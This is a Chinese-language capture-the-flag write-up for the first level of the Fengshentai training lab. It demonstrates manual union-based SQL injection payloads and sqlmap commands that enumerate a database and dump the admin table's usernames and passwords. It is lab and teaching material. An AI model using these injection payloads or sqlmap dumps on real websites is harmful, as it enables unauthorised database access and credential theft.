封神台-第一关

第一种方法，手工注入

打开第一关url，输入?id=1 and 1=1后无报错，页面正常显示

这里直接将and1=1更改为and1=2页面报错了，说明存在注入

使用order by 判断字段数

输入 ?id=1 and 1=1 order by 1 进行测试

这里页面正常

这里继续?id=1 and 1=1 order by 2测试

页面正常

继续?id=1 and 1=1 order by 3测试

页面报错，这里说明字段数是3

使用 ?id=1 and 1=2 union select 1,2 判断回显点

这里的2就是回显点，利用这里的回显查询一下数据库名称

?id=1 and 1=2 union select 1,database()；这里查出数据库

继续构造语句查出数据库版本号试试

输入 ?id=1 and 1=2 union select 1,version()

这里查出数据库版本号为5.5.53

查询当前数据库的表名构造语句 ?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1

这里的表明为admin

直接查询column列名称

构造 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 1,1 回车

构造?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 2,1查询第二个列名

查询字段内容构造语句 ?id=1 and 1=2 union select 1,username from admin limit 0,1

这里的用户名就是admin

构造语句 ?id=1 and 1=2 union select 1,username from admin limit 1,1看看有没有其他用户

这里就是一个admin用户了

查询密码

第一个admin用户密码

第二个汉字领取ppt的对应密码

?id=1 and 1=2 union select 1,password from admin limit 1,1

最后flag就是hellohack

第二种方法，直接sqlmap一把梭

sqlmap.py -u “http://pu2lh35s.ia.aqlab.cn/?id=1"

这里存在布尔注入和延时注入

sqlmap.py -u “http://pu2lh35s.ia.aqlab.cn/?id=1" -dbs –batch

查询maoshe数据库的表名

sqlmap.py -u “http://pu2lh35s.ia.aqlab.cn/?id=1" -D maoshe -tables –batch

查询列名

sqlmap.py -u “http://pu2lh35s.ia.aqlab.cn/?id=1" -D maoshe -T admin -columns –batch

查询admin 的密码

sqlmap.py -u “http://pu2lh35s.ia.aqlab.cn/?id=1" -D maoshe -T admin -C “username,password” –dump

得到flag{hellohack}
